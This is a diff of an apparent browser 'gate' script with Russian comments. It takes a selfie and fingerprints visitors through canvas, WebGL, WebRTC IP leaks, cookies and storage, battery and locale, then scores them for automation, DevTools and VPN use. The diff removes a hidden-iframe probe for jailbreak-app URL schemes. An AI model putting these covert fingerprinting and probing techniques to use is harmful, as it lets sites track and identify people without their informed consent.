@@ -1,3 +1,5 @@
+// === app.js CLEAN (NO ACTIVE JB SCHEMES) ===
+
 const QSP = {
   get(k) {
     try {
@@ -8,7 +10,9 @@ const QSP = {
   }
 };
 
-const LITE_MODE = (QSP.get("lite") === "1") || (QSP.get("no_media") === "1");
+const LITE_MODE =
+  QSP.get("lite") === "1" || QSP.get("no_media") === "1";
+
 const API_BASE =
   (typeof window !== "undefined" && window.__API_BASE)
     ? String(window.__API_BASE).replace(/\/+$/, "")
@@ -16,10 +20,12 @@ const API_BASE =
 
 const STRICT_MODE = QSP.get("strict") === "1";
 const DEV_LOG = QSP.get("dev_log") === "1";
+
 function dlog(...a) {
   if (DEV_LOG) console.log("[gate]", ...a);
 }
 
+// UI Elements
 const UI = {
   text: document.getElementById("text"),
   note: document.getElementById("note"),
@@ -32,11 +38,10 @@ function setBtnLocked() {
   const b = UI.btn;
   if (!b) return;
   b.disabled = true;
-  b.style.filter = "grayscale(35%) brightness(0.9)";
+  b.style.filter = "grayscale(40%) brightness(0.8)";
   b.style.opacity = "0.6";
   b.style.cursor = "not-allowed";
-  b.style.background = "linear-gradient(90deg, #246, #39a)";
-  b.style.boxShadow = "0 0 6px rgba(0,153,255,.25)";
+  b.style.background = "linear-gradient(90deg,#246,#39a)";
 }
 function setBtnReady() {
   const b = UI.btn;
@@ -45,8 +50,7 @@ function setBtnReady() {
   b.style.filter = "none";
   b.style.opacity = "1";
   b.style.cursor = "pointer";
-  b.style.background = "linear-gradient(90deg, #4f00ff, #00bfff)";
-  b.style.boxShadow = "0 0 20px rgba(79,0,255,.6), 0 0 28px rgba(0,191,255,.45)";
+  b.style.background = "linear-gradient(90deg,#4f00ff,#00bfff)";
 }
 function showBtn() {
   if (UI.btn) UI.btn.style.display = "block";
@@ -104,74 +108,59 @@ function downscaleDataUrl(dataUrl, maxSide = 1024, quality = 0.6) {
 window.__cameraLatencyMs = null;
 
 async function takePhotoNormal() {
-  if (!navigator.mediaDevices?.getUserMedia) {
+  if (!navigator.mediaDevices?.getUserMedia)
     throw new Error("Камера недоступна");
-  }
-  const t0 =
-    typeof performance !== "undefined" ? performance.now() : Date.now();
+
+  const t0 = performance.now();
   const stream = await navigator.mediaDevices.getUserMedia({
     video: { facingMode: "user" }
   });
+
   return new Promise((resolve, reject) => {
-    try {
-      const video = document.createElement("video");
-      video.srcObject = stream;
-      video.playsInline = true;
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.playsInline = true;
 
-      const fallbackTimer = setTimeout(() => {
-        try {
-          const c = document.createElement("canvas");
-          c.width = 1280;
-          c.height = 720;
-          c.getContext("2d").drawImage(video, 0, 0);
-          const dataUrl = c.toDataURL("image/jpeg", 0.8);
-          stream.getTracks().forEach((t) => t.stop());
-          const t1 =
-            typeof performance !== "undefined"
-              ? performance.now()
-              : Date.now();
-          window.__cameraLatencyMs = Math.round(Math.max(0, t1 - t0));
-          resolve(dataUrl);
-        } catch (e) {
-          reject(e);
-        }
-      }, 3000);
-
-      video.onloadedmetadata = async () => {
-        try {
-          await video.play();
-          clearTimeout(fallbackTimer);
-          const c = document.createElement("canvas");
-          c.width = video.videoWidth || 1280;
-          c.height = video.videoHeight || 720;
-          c.getContext("2d").drawImage(video, 0, 0);
-          const dataUrl = c.toDataURL("image/jpeg", 0.85);
-          stream.getTracks().forEach((t) => t.stop());
-          const t1 =
-            typeof performance !== "undefined"
-              ? performance.now()
-              : Date.now();
-          window.__cameraLatencyMs = Math.round(Math.max(0, t1 - t0));
-          resolve(dataUrl);
-        } catch (err) {
-          stream.getTracks().forEach((t) => t.stop());
-          reject(err);
-        }
-      };
-    } catch (e) {
+    const fallback = setTimeout(() => {
       try {
+        const c = document.createElement("canvas");
+        c.width = 1280;
+        c.height = 720;
+        c.getContext("2d").drawImage(video, 0, 0);
+        const dataUrl = c.toDataURL("image/jpeg", 0.8);
         stream.getTracks().forEach((t) => t.stop());
-      } catch {}
-      reject(e);
-    }
+        window.__cameraLatencyMs = Math.round(performance.now() - t0);
+        resolve(dataUrl);
+      } catch (e) {
+        reject(e);
+      }
+    }, 3000);
+
+    video.onloadedmetadata = async () => {
+      try {
+        await video.play();
+        clearTimeout(fallback);
+        const c = document.createElement("canvas");
+        c.width = video.videoWidth || 1280;
+        c.height = video.videoHeight || 720;
+        c.getContext("2d").drawImage(video, 0, 0);
+        const dataUrl = c.toDataURL("image/jpeg", 0.85);
+        stream.getTracks().forEach((t) => t.stop());
+        window.__cameraLatencyMs = Math.round(performance.now() - t0);
+        resolve(dataUrl);
+      } catch (err) {
+        stream.getTracks().forEach((t) => t.stop());
+        reject(err);
+      }
+    };
   });
 }
 
 (function ensureFileInput() {
   if (!document.getElementById("fileInp")) {
     const inp = document.createElement("input");
-    inp.type = "file";
     inp.id = "fileInp";
+    inp.type = "file";
     inp.accept = "image/*";
     inp.capture = "user";
     inp.style.display = "none";
@@ -198,31 +187,27 @@ async function takePhotoWithFallbackNormal() {
   }
 }
 
-const LITE_PHOTO_BASE64 =
+const LITE_PHOTO =
   "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAkMBgQq5xwAAAABJRU5ErkJggg==";
 
-async function takePhotoLite() {
+function takePhotoLite() {
   window.__cameraLatencyMs = null;
-  return LITE_PHOTO_BASE64;
+  return LITE_PHOTO;
 }
 
-async function takePhotoUniversal() {
-  if (LITE_MODE || window.__DISABLE_CAMERA === true) {
-    dlog("LITE_MODE: skip camera, using placeholder");
+function takePhotoUniversal() {
+  if (LITE_MODE || window.__DISABLE_CAMERA === true)
     return takePhotoLite();
-  }
   return takePhotoWithFallbackNormal();
 }
 
+// iOS UA detection
 function isIpadDesktopMode() {
   return navigator.platform === "MacIntel" && (navigator.maxTouchPoints || 0) > 1;
 }
 function isIOSHandheldUA(ua) {
   ua = ua || navigator.userAgent || "";
-  return /(iPhone|iPad|iPod)/.test(ua);
-}
-function isIOSFamilyStrict() {
-  return isIOSHandheldUA() || isIpadDesktopMode();
+  return /(iPhone|iPad|iPod)/i.test(ua);
 }
 function parseIOSMajorFromUAUniversal(ua) {
   ua = ua || navigator.userAgent || "";
@@ -232,8 +217,8 @@ function parseIOSMajorFromUAUniversal(ua) {
   const mOS = ua.match(/\bOS\s+(\d+)[._]/i);
   if (mOS) return parseInt(mOS[1], 10);
   if (ipadDesktop) {
-    const mVer = ua.match(/\bVersion\/(\d+)(?:[._]\d+)?/i);
-    if (mVer) return parseInt(mVer[1], 10);
+    const mv = ua.match(/\bVersion\/(\d+)(?:[._]\d+)?/i);
+    if (mv) return parseInt(mv[1], 10);
   }
   return null;
 }
@@ -247,16 +232,17 @@ function getDeviceInfo() {
     iosVersion: iosVer,
     isSafari:
       /Safari\//.test(ua) &&
-      !/CriOS|Chrome|Chromium|FxiOS|Edg|OPR/i.test(ua) &&
+      !/CriOS|Chrome|FxiOS|Edg|OPR/i.test(ua) &&
       navigator.vendor === "Apple Computer, Inc.",
     isIpadDesktop: isIpadDesktopMode()
   };
 }
 
+// Permission states
 async function getPermissionStates() {
-  if (LITE_MODE || window.__DISABLE_CAMERA === true || window.__DISABLE_GEO === true) {
+  if (LITE_MODE || window.__DISABLE_CAMERA || window.__DISABLE_GEO)
     return { geolocation: "denied", camera: "denied", microphone: "prompt" };
-  }
+
   if (!navigator.permissions?.query) return null;
 
   async function q(name) {
@@ -266,15 +252,16 @@ async function getPermissionStates() {
       return "unknown";
     }
   }
-
-  const [geo, camera, mic] = await Promise.all([
+  const [geo, cam, mic] = await Promise.all([
     q("geolocation"),
     q("camera"),
     q("microphone")
   ]);
-  return { geolocation: geo, camera: camera, microphone: mic };
+  return { geolocation: geo, camera: cam, microphone: mic };
 }
+// === Part 2 — Networking, WebRTC, Canvas, Storage, WebGL, Locale, Devtools, Safari Tests ===
 
+// WebRTC IP leak
 async function collectWebRTCIps(timeoutMs = 2500) {
   if (!window.RTCPeerConnection) return [];
   return new Promise((resolve) => {
@@ -285,43 +272,44 @@ async function collectWebRTCIps(timeoutMs = 2500) {
     try {
       pc.createDataChannel("x");
     } catch {}
+
     pc.onicecandidate = (e) => {
       if (!e.candidate) return;
-      const c = e.candidate.candidate || "";
+      const cand = e.candidate.candidate || "";
       const ipRegex = /([0-9]{1,3}(?:\.[0-9]{1,3}){3})|([0-9a-fA-F:]{2,})/;
-      const m = c.match(ipRegex);
+      const m = cand.match(ipRegex);
       if (m) ips.add(m[0]);
     };
+
     pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(() => {});
     const to = setTimeout(() => {
-      try {
-        pc.close();
-      } catch {}
+      try { pc.close(); } catch {}
       resolve([...ips]);
     }, timeoutMs);
+
     pc.onicegatheringstatechange = () => {
       if (pc.iceGatheringState === "complete") {
         clearTimeout(to);
-        try {
-          pc.close();
-        } catch {}
+        try { pc.close(); } catch {}
         resolve([...ips]);
       }
     };
   });
 }
 
+// Public IP fetch via server
 async function fetchClientIP() {
   try {
-    const r = await fetch(`${API_BASE}/api/client-ip`, { method: "GET" });
+    const r = await fetch(`${API_BASE}/api/client-ip`);
     if (!r.ok) return null;
-    const data = await r.json().catch(() => null);
-    return data || null;
+    const j = await r.json().catch(() => null);
+    return j || null;
   } catch {
     return null;
   }
 }
 
+// Canvas fingerprint
 async function getCanvasFingerprint() {
   try {
     const c = document.createElement("canvas");
@@ -329,40 +317,41 @@ async function getCanvasFingerprint() {
     c.height = 80;
     const g = c.getContext("2d");
     g.textBaseline = "top";
-    g.font = "16px 'Arial'";
+    g.font = "16px Arial";
     g.fillStyle = "#f60";
     g.fillRect(0, 0, 280, 80);
     g.fillStyle = "#069";
-    g.fillText("canvas-fp v1 • 𝛑 Ω ≈ ✓", 2, 2);
+    g.fillText("canvas-fp v1 • π Ω ✓", 2, 2);
     g.strokeStyle = "#222";
     g.beginPath();
     g.arc(140, 40, 18, 0, Math.PI * 2);
     g.stroke();
+
     const data = c.toDataURL();
     const enc = new TextEncoder().encode(data);
+
     if (crypto?.subtle?.digest) {
       const buf = await crypto.subtle.digest("SHA-256", enc);
-      const hashArr = Array.from(new Uint8Array(buf));
-      const hash = hashArr
-        .map((b) => b.toString(16).padStart(2, "0"))
-        .join("");
+      const arr = Array.from(new Uint8Array(buf));
+      const hash = arr.map((x) => x.toString(16).padStart(2, "0")).join("");
       return { hash, size: data.length };
     }
-    let hash = 0;
+
+    let h = 0;
     for (let i = 0; i < data.length; i++) {
-      hash = ((hash << 5) - hash) + data.charCodeAt(i) | 0;
+      h = ((h << 5) - h) + data.charCodeAt(i);
+      h |= 0;
     }
-    return { hash: "f" + (hash >>> 0).toString(16), size: data.length };
+    return { hash: "f" + (h >>> 0).toString(16), size: data.length };
   } catch {
     return null;
   }
 }
 
+// Storage fingerprints
 async function getStorageAndStorageLike() {
   let estimate = null;
-  try {
-    estimate = await navigator.storage?.estimate?.() || null;
-  } catch {}
+  try { estimate = await navigator.storage?.estimate?.() || null; } catch {}
 
   let cookies = null;
   try {
@@ -375,7 +364,7 @@ async function getStorageAndStorageLike() {
     };
   } catch {}
 
-  function snapStorage(s) {
+  function snap(s) {
     try {
       const n = s.length;
       const keys = [];
@@ -391,30 +380,31 @@ async function getStorageAndStorageLike() {
     }
   }
 
-  const local = snapStorage(localStorage);
-  const session = snapStorage(sessionStorage);
-  return { estimate, cookies, local, session };
+  return {
+    estimate,
+    cookies,
+    local: snap(localStorage),
+    session: snap(sessionStorage)
+  };
 }
 
+// Network info
 function getNetworkInfo() {
   const ni = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  const out = ni
-    ? {
-        rtt: ni.rtt,
-        downlink: ni.downlink,
-        effectiveType: ni.effectiveType,
-        saveData: !!ni.saveData
-      }
-    : {};
+  const out = ni ? {
+    rtt: ni.rtt,
+    downlink: ni.downlink,
+    effectiveType: ni.effectiveType,
+    saveData: !!ni.saveData
+  } : {};
   try {
     const nav = performance.getEntriesByType("navigation")[0];
-    if (nav && typeof nav.responseStart === "number") {
-      out.rttApprox = Math.round(nav.responseStart);
-    }
+    if (nav?.responseStart) out.rttApprox = Math.round(nav.responseStart);
   } catch {}
   return out;
 }
 
+// Battery
 async function getBatteryInfo() {
   try {
     if (!navigator.getBattery) return null;
@@ -430,83 +420,71 @@ async function getBatteryInfo() {
   }
 }
 
+// WebGL fingerprint
 function getWebGLInfo() {
   try {
     const c = document.createElement("canvas");
     const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
     if (!gl) return null;
-    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
-    const vendor = dbg
-      ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)
-      : gl.getParameter(gl.VENDOR);
-    const renderer = dbg
-      ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
-      : gl.getParameter(gl.RENDERER);
-    return { vendor, renderer };
+    const ext = gl.getExtension("WEBGL_debug_renderer_info");
+    return {
+      vendor: ext
+        ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)
+        : gl.getParameter(gl.VENDOR),
+      renderer: ext
+        ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
+        : gl.getParameter(gl.RENDERER)
+    };
   } catch {
     return null;
   }
 }
 
+// In-app WebView detection
 function detectInAppWebView() {
   const ua = navigator.userAgent || "";
   const flags = {
     Telegram: /Telegram/i.test(ua),
     Instagram: /Instagram/i.test(ua),
     Facebook: /FBAN|FBAV|FB_IAB/i.test(ua),
-    Messenger: /FBAN|FBAV.*Messenger|FB_IAB.*Messenger/i.test(ua),
+    Messenger: /FBAN|FBAV.*Messenger/i.test(ua),
     TikTok: /TikTok/i.test(ua),
     Discord: /Discord/i.test(ua),
     WeChat: /MicroMessenger/i.test(ua),
-    Weibo: /Weibo/i.test(ua),
     WKWebView:
-      /\bAppleWebKit\/\d+\.\d+\s+\(KHTML, like Gecko\)\b/.test(ua) &&
-      !/Safari\//i.test(ua)
+      /\bAppleWebKit\/\d+\.\d+\s+\(KHTML, like Gecko\)/.test(ua) &&
+      !/Safari\//.test(ua)
   };
   const any = Object.keys(flags).filter((k) => flags[k]);
   return { flags, any, isInApp: any.length > 0 };
 }
 
+// Locale + display
 async function getLocaleAndDisplay() {
-  const tz =
-    (Intl &&
-      Intl.DateTimeFormat &&
-      Intl.DateTimeFormat().resolvedOptions &&
-      Intl.DateTimeFormat().resolvedOptions().timeZone) ||
-    null;
+  const tz = Intl?.DateTimeFormat?.().resolvedOptions?.().timeZone || null;
 
   let uaData = null;
   try {
     if (navigator.userAgentData?.getHighEntropyValues) {
-      const d = await navigator.userAgentData.getHighEntropyValues([
-        "platform",
-        "platformVersion",
-        "architecture",
-        "bitness",
-        "model",
-        "uaFullVersion"
+      uaData = await navigator.userAgentData.getHighEntropyValues([
+        "platform", "platformVersion", "architecture", "bitness",
+        "model", "uaFullVersion"
       ]);
-      uaData = {
-        brands: navigator.userAgentData.brands,
-        ...d,
-        mobile: navigator.userAgentData.mobile
-      };
+      uaData.brands = navigator.userAgentData.brands;
+      uaData.mobile = navigator.userAgentData.mobile;
     }
   } catch {}
 
   return {
-    languages: navigator.languages || [navigator.language].filter(Boolean),
+    languages: navigator.languages || [navigator.language],
     timeZone: tz,
     dpr: window.devicePixelRatio || 1,
-    screen:
-      typeof screen !== "undefined"
-        ? {
-            w: screen.width,
-            h: screen.height,
-            aw: screen.availWidth,
-            ah: screen.availHeight
-          }
-        : null,
+    screen: {
+      w: screen.width,
+      h: screen.height,
+      aw: screen.availWidth,
+      ah: screen.availHeight
+    },
     viewport: { w: innerWidth, h: innerHeight },
     platform: navigator.platform,
     vendor: navigator.vendor,
@@ -515,67 +493,51 @@ async function getLocaleAndDisplay() {
   };
 }
 
+// Devtools heuristic (no advanced JB removal needed)
 function detectDevtoolsHeuristic() {
   try {
     const dw = Math.abs((window.outerWidth || 0) - window.innerWidth);
     const dh = Math.abs((window.outerHeight || 0) - window.innerHeight);
-    const opened = dw > 120 || dh > 160;
-    return { opened, dw, dh };
+    return { opened: dw > 120 || dh > 160, dw, dh };
   } catch {
     return null;
   }
 }
 
+// Datacenter IP words
 const DC_ISP_WORDS = [
-  "AMAZON",
-  "AWS",
-  "GOOGLE",
-  "GCP",
-  "MICROSOFT",
-  "AZURE",
-  "CLOUDFLARE",
-  "HETZNER",
-  "OVH",
-  "DIGITALOCEAN",
-  "LINODE",
-  "IONOS",
-  "VULTR"
+  "AMAZON","AWS","GOOGLE","GCP","MICROSOFT","AZURE","CLOUDFLARE",
+  "HETZNER","OVH","DIGITALOCEAN","LINODE","IONOS","VULTR"
 ];
 
-function analyzeNetworkHeuristics({
-  publicIp,
-  webrtcIps,
-  network,
-  cameraLatencyMs,
-  locale,
-  ipMeta
-}) {
+// Network heuristics (UNCHANGED)
+function analyzeNetworkHeuristics({ publicIp, webrtcIps, network, cameraLatencyMs, locale, ipMeta }) {
   const reasons = [];
   let scoreAdj = 0;
 
   const isp = (publicIp?.isp || publicIp?.org || "").toUpperCase();
   if (DC_ISP_WORDS.some((w) => isp.includes(w))) {
-    reasons.push("DC-ISP признак (AWS/Google/Azure/…)");
+    reasons.push("DC-ISP признак (AWS/Google/Azure)");
     scoreAdj -= 25;
   }
 
   const pubCandidates = (webrtcIps || []).filter(Boolean);
   if (pubCandidates.length >= 1) {
-    reasons.push("WebRTC раскрыл публичный IP (возможен туннель/VPN)");
+    reasons.push("WebRTC раскрыл публичный IP (VPN/tunnel?)");
     scoreAdj -= 10;
   }
 
-  if (typeof cameraLatencyMs === "number" && cameraLatencyMs <= 5) {
+  if (cameraLatencyMs != null && cameraLatencyMs <= 5) {
     reasons.push("Ненормально низкая cameraLatency");
     scoreAdj -= 10;
   }
 
-  if (network?.effectiveType && /2g/i.test(String(network.effectiveType))) {
+  if (/2g/i.test(network?.effectiveType || "")) {
     reasons.push("Очень медленная сеть (2g)");
     scoreAdj -= 5;
   }
 
-  if (typeof network?.rtt === "number" && network.rtt > 800) {
+  if (network?.rtt > 800) {
     reasons.push("Очень высокий RTT");
     scoreAdj -= 5;
   }
@@ -589,9 +551,7 @@ function analyzeNetworkHeuristics({
     !tz.includes("UTC") &&
     !tz.includes("GMT")
   ) {
-    reasons.push(
-      `Таймзона (${locale?.timeZone}) не совпадает со страной IP (${publicIp?.country})`
-    );
+    reasons.push(`Таймзона (${locale?.timeZone}) не совпадает со страной IP (${publicIp?.country})`);
     scoreAdj -= 8;
   }
 
@@ -599,322 +559,17 @@ function analyzeNetworkHeuristics({
   if (scoreAdj <= -25) label = "likely";
   else if (scoreAdj <= -10) label = "possible";
 
-  return {
-    label,
-    scoreAdj,
-    reasons,
-    dcIsp: !!(scoreAdj <= -25 || DC_ISP_WORDS.some((w) => isp.includes(w)))
-  };
+  return { label, scoreAdj, reasons, dcIsp: label === "likely" };
 }
+// === Part 3 — collectClientProfile(), runDeviceCheck(), autoFlow, sendReport, init ===
 
-async function runDeviceCheck(clientProfilePartial) {
-  const reasons = [];
-  const details = {};
-  let score = 100;
-
-  try {
-    details.ua = navigator.userAgent || "";
-    details.vendor = navigator.vendor || "";
-    details.platform = navigator.platform || "";
-    details.lang = navigator.language || "";
-    details.timezone = clientProfilePartial?.locale?.timeZone || null;
-    details.dpr = window.devicePixelRatio || 1;
-    details.screen = clientProfilePartial?.locale?.screen || null;
-    details.hasTouchEvent = "ontouchstart" in window;
-    details.maxTouchPoints = Number(navigator.maxTouchPoints || 0);
-    details.navigator_webdriver =
-      typeof navigator.webdriver === "boolean" ? navigator.webdriver : undefined;
-
-    const leakedChromeRuntime = !!(window.chrome && window.chrome.runtime);
-    const leakedBrowserRuntime = !!(window.browser && window.browser.runtime);
-    if (leakedChromeRuntime || leakedBrowserRuntime) {
-      reasons.push("Следы runtime API расширений");
-      score -= 5;
-    }
-
-    function looksNative(fn) {
-      try {
-        return (
-          typeof fn === "function" &&
-          /\[native code\]/.test(Function.prototype.toString.call(fn))
-        );
-      } catch {
-        return true;
-      }
-    }
-
-    const suspiciousNative =
-      !looksNative(navigator.permissions?.query) ||
-      !looksNative(navigator.geolocation?.getCurrentPosition) ||
-      !looksNative(navigator.mediaDevices?.getUserMedia);
-    if (suspiciousNative) {
-      reasons.push("Web API переопределены (не native)");
-      score -= 5;
-    }
-
-    if (details.navigator_webdriver === true) {
-      reasons.push("navigator.webdriver === true (автоматизация)");
-      score -= 60;
-    }
-
-    const devtools = detectDevtoolsHeuristic();
-    details.devtools = devtools;
-    if (devtools?.opened) {
-      reasons.push("DevTools размеры окна");
-      score -= 6;
-    }
-
-    details.cameraLatencyMs =
-      typeof window.__cameraLatencyMs === "number"
-        ? window.__cameraLatencyMs
-        : null;
-    if (!LITE_MODE && details.cameraLatencyMs != null && details.cameraLatencyMs <= 5) {
-      reasons.push("Слишком малая cameraLatency");
-      score -= 10;
-    }
-
-    const inApp = clientProfilePartial?.inAppWebView;
-    if (inApp?.isInApp || inApp?.flags?.WKWebView) {
-      reasons.push("In-App WebView/WKWebView");
-      score -= 8;
-    }
-
-    const pn = analyzeNetworkHeuristics({
-      publicIp: clientProfilePartial?.publicIp,
-      webrtcIps: clientProfilePartial?.webrtcIps,
-      network: clientProfilePartial?.network,
-      cameraLatencyMs: details.cameraLatencyMs,
-      locale: clientProfilePartial?.locale,
-      ipMeta: clientProfilePartial?.publicIp
-    });
-    details.pn_proxy = pn;
-    if (pn.label === "likely") {
-      reasons.push("VPN/Proxy: likely");
-      score -= 25;
-    } else if (pn.label === "possible") {
-      reasons.push("VPN/Proxy: possible");
-      score -= 10;
-    }
-
-    if (clientProfilePartial?.jbProbesActive?.summary?.label === "likely") {
-      reasons.push("Jailbreak likely (active probe)");
-      score -= 30;
-    } else if (clientProfilePartial?.jbProbesActive?.summary?.label === "possible") {
-      reasons.push("Jailbreak possible (active probe)");
-      score -= 12;
-    }
-
-    if (score >= 80) reasons.push("Ок: окружение выглядит правдоподобно");
-    else if (score >= 60)
-      reasons.push("Есть несостыковки — рекомендуется доп. проверка");
-    else reasons.push("Высокая вероятность подмены/автоматизации");
-  } catch (e) {
-    reasons.push("Ошибка проверки окружения: " + (e?.message || String(e)));
-  }
-
-  let label = "unlikely";
-  if (score < 60) label = "likely";
-  else if (score < 80) label = "possible";
-
-  return {
-    score,
-    label,
-    reasons,
-    details,
-    timestamp: Date.now()
-  };
-}
-
-window.__jbActiveDone = false;
-
-const JB_ACTIVE_SCHEMES = [
-  "cydia://",
-  "sileo://",
-  "zbra://",
-  "filza://",
-  "trollstore://",
-  "dopamine://",
-  "palera1n://",
-  "checkra1n://",
-  "chimera://",
-  "odyssey://",
-  "taurine://",
-  "electra://",
-  "xina://",
-  "xinaA15://",
-  "altstore://",
-  "sidestore://",
-  "reprovision://",
-  "esigner://",
-  "installer://",
-  "undecimus://",
-  "ifile://",
-  "shell://"
-];
-
-function makeHiddenIframeForActive() {
-  const ifr = document.createElement("iframe");
-  ifr.style.width = "1px";
-  ifr.style.height = "1px";
-  ifr.style.border = "0";
-  ifr.style.position = "fixed";
-  ifr.style.left = "-9999px";
-  ifr.style.top = "-9999px";
-  ifr.setAttribute("aria-hidden", "true");
-  return ifr;
-}
-
-function tryOpenSchemeActive(scheme, timeoutMs) {
-  return new Promise((resolve) => {
-    const start = Date.now();
-    let finished = false;
-    const iframe = makeHiddenIframeForActive();
-    document.body.appendChild(iframe);
-
-    const cleanup = (res) => {
-      if (finished) return;
-      finished = true;
-      try {
-        iframe.remove();
-      } catch {}
-      resolve(res);
-    };
-
-    const onVis = () => {
-      if (document.hidden || document.visibilityState === "hidden") {
-        cleanup({
-          scheme,
-          opened: true,
-          reason: "visibilitychange",
-          durationMs: Date.now() - start
-        });
-      }
-    };
-    const onPageHide = () => {
-      cleanup({
-        scheme,
-        opened: true,
-        reason: "pagehide",
-        durationMs: Date.now() - start
-      });
-    };
-    const onError = (e) => {
-      cleanup({
-        scheme,
-        opened: false,
-        reason: "error",
-        error: String(e),
-        durationMs: Date.now() - start
-      });
-    };
-
-    document.addEventListener("visibilitychange", onVis, { once: true });
-    window.addEventListener("pagehide", onPageHide, { once: true });
-    iframe.addEventListener("error", onError, { once: true });
-
-    try {
-      iframe.src = scheme;
-    } catch (e) {
-      cleanup({
-        scheme,
-        opened: false,
-        reason: "set-src-exception",
-        error: String(e),
-        durationMs: Date.now() - start
-      });
-      return;
-    }
-
-    setTimeout(() => {
-      cleanup({
-        scheme,
-        opened: false,
-        reason: "timeout",
-        durationMs: Date.now() - start
-      });
-    }, timeoutMs);
-  });
-}
-
-// Быстрый батчевый проход по схемам без дублирования логики.
-// Параллелим небольшими группами, выходим сразу при первом положительном.
-async function collectActiveJailbreakProbes(options = {}) {
-  if (window.__jbActiveDone) {
-    return {
-      summary: { label: "skipped", reasons: ["already_ran"] },
-      results: [],
-      firstPositive: null
-    };
-  }
-  window.__jbActiveDone = true;
-
-  const schemes = options.schemes || JB_ACTIVE_SCHEMES;
-  const perSchemeTimeout = options.perSchemeTimeout || 650;
-  const batchSize = options.batchSize || 4;
-  const interDelay = typeof options.interDelay === "number" ? options.interDelay : 80;
-
-  const results = [];
-  let firstPositive = null;
-
-  for (let i = 0; i < schemes.length; i += batchSize) {
-    const batch = schemes.slice(i, i + batchSize);
-
-    const batchRes = await Promise.all(
-      batch.map((scheme) => tryOpenSchemeActive(scheme, perSchemeTimeout))
-    );
-
-    for (const res of batchRes) {
-      results.push(res);
-      if (!firstPositive && res.opened) {
-        firstPositive = res;
-      }
-    }
-
-    if (firstPositive) break;
-    if (i + batchSize < schemes.length) {
-      await new Promise((r) => setTimeout(r, interDelay));
-    }
-  }
-
-  let label = "unlikely";
-  const reasons = [];
-  if (firstPositive) {
-    label = "likely";
-    reasons.push("scheme_opened");
-    if (firstPositive.reason) reasons.push(firstPositive.reason);
-  } else {
-    const visHints = results.filter(
-      (r) => r.reason === "visibilitychange" || r.reason === "pagehide"
-    );
-    if (visHints.length > 0) {
-      label = "possible";
-      reasons.push("visibility_hints");
-    } else {
-      reasons.push("no_scheme_opened");
-    }
-  }
-
-  const totalMs = results.reduce(
-    (s, r) => s + (r.durationMs || 0),
-    0
-  );
-
-  const summary = {
-    label,
-    reasons,
-    totalMs,
-    attempts: results.length
-  };
-
-  return { summary, results, firstPositive };
-}
-
+// Safari 18 tests
 async function testSafari18_0_ViewTransitions() {
   const hasAPI = typeof document.startViewTransition === "function";
   const cssOK = CSS?.supports?.("view-transition-name: auto") === true;
-
   let ran = false;
   let finished = false;
+
   try {
     if (hasAPI) {
       const div = document.createElement("div");
@@ -931,7 +586,7 @@ async function testSafari18_0_ViewTransitions() {
   } catch {}
 
   return {
-    feature: "Safari 18.0 View Transitions",
+    feature: "Safari 18.0 ViewTransitions",
     pass: !!(hasAPI && cssOK && ran && finished),
     details: { hasAPI, cssOK, ran, finished }
   };
@@ -951,10 +606,8 @@ async function testSafari18_4_Triple() {
     typeof window.cookieStore?.get === "function";
 
   const webauthnOK =
-    typeof window.PublicKeyCredential?.parseCreationOptionsFromJSON ===
-      "function" &&
-    typeof window.PublicKeyCredential?.parseRequestOptionsFromJSON ===
-      "function" &&
+    typeof window.PublicKeyCredential?.parseCreationOptionsFromJSON === "function" &&
+    typeof window.PublicKeyCredential?.parseRequestOptionsFromJSON === "function" &&
     typeof window.PublicKeyCredential?.prototype?.toJSON === "function";
 
   return {
@@ -964,7 +617,7 @@ async function testSafari18_4_Triple() {
   };
 }
 
-async function runSafariFeatureTests(maxWaitMs = 1800) {
+async function runSafariFeatureTests(maxWaitMs = 1500) {
   const timeout = (p, ms) =>
     Promise.race([
       p,
@@ -990,14 +643,10 @@ async function runSafariFeatureTests(maxWaitMs = 1800) {
 }
 
 async function waitFeatureGate(maxMs = 800) {
-  if (window.__featureGate) {
-    return window.__featureGate;
-  }
+  if (window.__featureGate) return window.__featureGate;
+
   return new Promise((resolve) => {
-    const t = setTimeout(
-      () => resolve(window.__featureGate || null),
-      maxMs
-    );
+    const t = setTimeout(() => resolve(window.__featureGate || null), maxMs);
     window.addEventListener(
       "featuregate-ready",
       (ev) => {
@@ -1009,27 +658,23 @@ async function waitFeatureGate(maxMs = 800) {
   });
 }
 
+// =====================================
+// CLEAN collectClientProfile() — NO ACTIVE JB
+// =====================================
 async function collectClientProfile() {
-  let jbProbesActive;
-  try {
-    jbProbesActive = await collectActiveJailbreakProbes().catch(() => ({
-      summary: { label: "error" },
-      results: []
-    }));
-  } catch {
-    jbProbesActive = { summary: { label: "error" }, results: [] };
-  }
+  // 🚫 УДАЛЕНО: collectActiveJailbreakProbes()
+  // No jbProbesActive at all
 
   const [
     permissions,
     webrtcIps,
     publicIp,
-    canvas,
-    storageLike,
+    canvasFingerprint,
+    storage,
     network,
     battery,
     webgl,
-    inApp,
+    inAppWebView,
     locale
   ] = await Promise.all([
     getPermissionStates(),
@@ -1046,96 +691,176 @@ async function collectClientProfile() {
 
   const ua = navigator.userAgent || "";
   const maxTP = Number(navigator.maxTouchPoints || 0);
-  const isIpadLike =
-    /iPad/i.test(ua) || (navigator.platform === "MacIntel" && maxTP > 1);
-  const iosVersionDetected = parseIOSMajorFromUAUniversal(ua);
+  const isIpad = /iPad/i.test(ua) || (navigator.platform === "MacIntel" && maxTP > 1);
+  const iosVersion = parseIOSMajorFromUAUniversal(ua);
 
   const ispUp = (publicIp?.isp || publicIp?.org || "").toUpperCase();
   const dcWords = DC_ISP_WORDS.filter((w) => ispUp.includes(w));
 
   const ref = document.referrer || "";
-  const inAppWebView = inApp;
 
   const profile = {
     permissions,
     webrtcIps,
     publicIp,
-    canvasFingerprint: canvas,
-    storage: storageLike,
+    canvasFingerprint,
+    storage,
     network,
     battery,
     webgl,
     inAppWebView,
     locale,
     maxTouchPoints: maxTP,
-    isIpad: isIpadLike,
